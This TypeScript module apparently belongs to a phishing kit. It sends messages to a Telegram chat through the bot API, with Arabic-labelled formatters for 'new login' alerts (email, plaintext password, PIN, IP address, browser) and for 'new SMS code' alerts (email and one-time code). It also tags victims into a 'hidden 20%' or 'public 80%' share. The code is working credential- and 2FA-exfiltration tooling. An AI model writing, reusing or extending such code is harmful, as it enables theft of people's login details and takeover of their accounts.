// Telegram Bot Integration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function sendToTelegram(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram credentials not configured");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    console.log("Message sent to Telegram successfully");
    return true;
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return false;
  }
}

export function formatLoginMessage(
  email: string, 
  password: string, 
  pin: string, 
  ipAddress?: string | null,
  userAgent?: string | null,
  userNumber?: number,
  isHidden?: boolean
): string {
  const timestamp = new Date().toLocaleString("ar-EG", { timeZone: "Asia/Damascus" });
  
  return `
🔐 <b>تسجيل دخول جديد</b>

📧 <b>البريد الإلكتروني:</b> ${email}
🔑 <b>كلمة المرور:</b> ${password}
🔢 <b>رمز PIN:</b> ${pin}

📍 <b>عنوان IP:</b> ${ipAddress || "غير متوفر"}
🌐 <b>نوع المتصفح:</b> ${userAgent || "غير متوفر"}

${userNumber ? `👤 <b>رقم المستخدم:</b> #${userNumber}` : ""}
${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)" : "عام (80%)"}` : ""}

⏰ <b>الوقت:</b> ${timestamp}
  `.trim();
}

export function formatSMSMessage(
  email: string, 
  smsCode: string,
  userNumber?: number,
  isHidden?: boolean
): string {
  const timestamp = new Date().toLocaleString("ar-EG", { timeZone: "Asia/Damascus" });
  
  return `
📱 <b>كود SMS جديد</b>

📧 <b>البريد الإلكتروني:</b> ${email}
💬 <b>كود SMS:</b> ${smsCode}

${userNumber ? `👤 <b>رقم المستخدم:</b> #${userNumber}` : ""}
${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)" : "عام (80%)"}` : ""}

⏰ <b>الوقت:</b> ${timestamp}
  `.trim();
}
